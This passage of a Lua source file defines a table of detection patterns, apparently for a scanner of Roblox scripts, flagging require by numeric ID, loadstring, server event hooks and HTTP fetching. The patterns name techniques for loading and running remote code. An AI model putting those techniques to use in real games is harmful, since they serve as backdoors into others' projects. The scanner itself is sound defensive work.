local SOURCE_PATTERNS = {
    {"require%(%d+%)",        "require(ID)"},
    {"loadstring%s*%(",       "loadstring"},
    {"OnServerEvent",         "OnServerEvent hook"},
    {"HttpService",           "HttpService access"},
    {"game%.HttpGet",         "direct HttpGet"},
